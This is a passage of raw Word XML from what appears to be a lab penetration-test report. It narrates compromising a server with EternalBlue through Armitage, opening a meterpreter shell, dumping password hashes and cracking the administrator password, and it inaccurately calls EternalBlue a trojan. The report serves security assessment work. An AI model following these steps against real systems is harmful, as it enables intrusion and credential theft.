      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> it was found they also had access to command prompt, allowing direct communication into the network from a valid </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">user. This allowed the pen tester to </w:t>
      </w:r>
      <w:r w:rsidR="00361BE7">
        <w:t>escalate the privileges by using net use, see steps below for more.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449AC909" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="00E15F8D" w:rsidP="00E15F8D">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="011F4467" w14:textId="77777777" w:rsidR="00E212C1" w:rsidRDefault="00407123" w:rsidP="00E212C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once </w:t>
      </w:r>
      <w:r w:rsidR="005860BE">
        <w:t>all previous steps have been completed it was possible to test a well-known exploit against both the servers through Armitage.</w:t>
      </w:r>
      <w:r w:rsidR="00E41584">
        <w:t xml:space="preserve"> As found through the vulnerability scans it was vulnerable to a well known trojan known as Eternal_Blue</w:t>
      </w:r>
      <w:r w:rsidR="00E212C1">
        <w:t xml:space="preserve">. By using </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E212C1">
        <w:t>Armitage</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E212C1">
        <w:t xml:space="preserve"> a connection was established to the target machine and Eternal_Blue was sent to it (target IP of </w:t>
      </w:r>
      <w:r w:rsidR="00E212C1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.2</w:t>
      </w:r>
      <w:r w:rsidR="00E212C1">
        <w:t xml:space="preserve">), and the target machine became compromised. Once this was completed, </w:t>
      </w:r>
      <w:r w:rsidR="00E212C1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>persistence</w:t>
      </w:r>
      <w:r w:rsidR="00E212C1">
        <w:t xml:space="preserve"> was used against the target machine and a new attack was launched on the other server (target IP of </w:t>
      </w:r>
      <w:r w:rsidR="00E212C1" w:rsidRPr="00E212C1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.</w:t>
      </w:r>
      <w:r w:rsidR="00E212C1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00E212C1">
        <w:t xml:space="preserve">) on the network. However as shown this created an error in </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E212C1">
        <w:t>Armitage.</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="004B7E63">
        <w:t>fig 22 &amp; 23)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278FC6A3" w14:textId="77777777" w:rsidR="00E212C1" w:rsidRDefault="00E212C1" w:rsidP="00E212C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51C41CED" w14:textId="77777777" w:rsidR="00E212C1" w:rsidRDefault="00E212C1" w:rsidP="00E212C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B96A0E6" w14:textId="77777777" w:rsidR="00E41584" w:rsidRDefault="004B7E63" w:rsidP="00E41584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251672576" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6C8A00DC" wp14:editId="054FD6A3">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>2991790</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>13970</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="1465872" cy="854563"/>
            <wp:effectExtent l="0" t="0" r="1270" b="317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56204" t="20535" r="24397" b="59360"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1465872" cy="8545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12C1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251671552" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="62E9CF1B" wp14:editId="3EBB18DF">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>1241036</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>13970</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="1124641" cy="873456"/>
            <wp:effectExtent l="0" t="0" r="0" b="317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66837" t="20624" r="19863" b="61008"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1124641" cy="8734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A79630" w14:textId="77777777" w:rsidR="00E41584" w:rsidRDefault="00E41584" w:rsidP="00E41584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14396204" w14:textId="77777777" w:rsidR="00261D49" w:rsidRPr="009525A9" w:rsidRDefault="00261D49" w:rsidP="00261D49">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7871FE3A" w14:textId="77777777" w:rsidR="00261D49" w:rsidRPr="009525A9" w:rsidRDefault="004B7E63" w:rsidP="00261D49">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251723776" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2AB60997" wp14:editId="249AB2E2">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>3467404</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>350672</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>
                <wp:wrapTopAndBottom/>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262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5AA30978" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>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B60997" id="_x0000_s1048" type="#_x0000_t202" style="position:absolute;margin-left:273pt;margin-top:27.6pt;width:42pt;height:20.65pt;z-index:251723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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5AA30978" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>23</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251721728" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5DCD5773" wp14:editId="29A0BE54">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>1558137</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>351155</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>
                <wp:wrapTopAndBottom/>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262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5A7E5470" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>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CD5773" id="_x0000_s1049" type="#_x0000_t202" style="position:absolute;margin-left:122.7pt;margin-top:27.65pt;width:42pt;height:20.65pt;z-index:251721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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5A7E5470" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>22</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="483301EA" w14:textId="77777777" w:rsidR="009525A9" w:rsidRPr="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67DD37CF" w14:textId="77777777" w:rsidR="00B93A35" w:rsidRDefault="004B7E63" w:rsidP="00B93A35">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251725824" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="16B27768" wp14:editId="579B90EB">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>2348179</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2083486</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>
                <wp:wrapTopAndBottom/>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262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="47314A86" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>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B27768" id="_x0000_s1050" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:184.9pt;margin-top:164.05pt;width:42pt;height:20.65pt;z-index:251725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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="47314A86" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>24</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00B93A35">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251673600" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="061373CC" wp14:editId="334E0638">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>828319</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="1300444" cy="1176793"/>
            <wp:effectExtent l="0" t="0" r="0" b="444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52035" t="19992" r="36169" b="61031"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1300444" cy="1176793"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00B93A35">
        <w:t xml:space="preserve">The Kali machine was restarted, and the previous steps mentioned against </w:t>
      </w:r>
      <w:r w:rsidR="00B93A35">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">192.168.0.2 </w:t>
      </w:r>
      <w:r w:rsidR="00B93A35">
        <w:t xml:space="preserve">were recreated and another attack was launched on it. However, instead of launching a second attack against the first machine a meterpreter shell was initiated on the original </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00B93A35">
        <w:t>target.</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>fig24)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB2FD2E" w14:textId="77777777" w:rsidR="00B93A35" w:rsidRDefault="00B93A35" w:rsidP="00B93A35">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69A7A6A6" w14:textId="77777777" w:rsidR="00B93A35" w:rsidRDefault="00B93A35" w:rsidP="00B93A35">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Once this was completed it was possible to begin grabbing data and items from the target server. First was a screenshot of the targets display.</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:t xml:space="preserve"> (fig 25)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB11F72" w14:textId="77777777" w:rsidR="00B93A35" w:rsidRDefault="00B93A35" w:rsidP="00B93A35">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29103CE5" w14:textId="77777777" w:rsidR="00B93A35" w:rsidRDefault="004B7E63" w:rsidP="00B93A35">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251728896" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="53515328" wp14:editId="71F003F0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>2435961</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2514320</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>
                <wp:wrapTopAndBottom/>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262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="574D80AC" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>25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515328" id="_x0000_s1051" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:191.8pt;margin-top:198pt;width:42pt;height:20.65pt;z-index:251728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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="574D80AC" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>25</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00B93A35">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251726848" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1FD4094C" wp14:editId="24756CDF">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>355</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2456180" cy="2447692"/>
            <wp:effectExtent l="0" t="0" r="127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36354" t="12832" r="20769" b="11205"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2456180" cy="2447692"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFCE6EB" w14:textId="77777777" w:rsidR="00B93A35" w:rsidRDefault="00B93A35" w:rsidP="00B93A35">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Then </w:t>
      </w:r>
      <w:r w:rsidR="004956A5">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">explore </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">menu was used to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>dump hashes</w:t>
      </w:r>
      <w:r w:rsidR="006E32CE">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="006E32CE">
        <w:t>results can be seen in appendi</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidR="004956A5">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00622CF7">
        <w:t xml:space="preserve"> F</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7733BB61" w14:textId="77777777" w:rsidR="006E32CE" w:rsidRDefault="006E32CE" w:rsidP="006E32CE"/>
    <w:p w14:paraId="16A87BBE" w14:textId="77777777" w:rsidR="006E32CE" w:rsidRDefault="006E32CE" w:rsidP="006E32CE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The hashes of all the passwords were then passed into </w:t>
      </w:r>
      <w:hyperlink r:id="rId32" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://hashkiller.co.uk/Cracker</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. This returned one broken hash out of a possible 33 as the Administrators password hash was found to be hashed with NTLM hashing, and when decrypted became Hacklab1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589FD31B" w14:textId="77777777" w:rsidR="006E32CE" w:rsidRDefault="00622CF7" w:rsidP="006E32CE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251734016" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="31F80A53" wp14:editId="13B0E926">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>186690</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4916805" cy="352425"/>
            <wp:effectExtent l="0" t="0" r="0" b="952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2081" t="78226" r="72946" b="18592"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4916805" cy="352425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06729DA9" w14:textId="77777777" w:rsidR="006E32CE" w:rsidRDefault="00622CF7" w:rsidP="006E32CE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
      </w:pPr>
      <w:r w:rsidRPr="00622CF7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251730944" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0C99F665" wp14:editId="098E44F4">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>425425</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>
                <wp:wrapTopAndBottom/>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262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
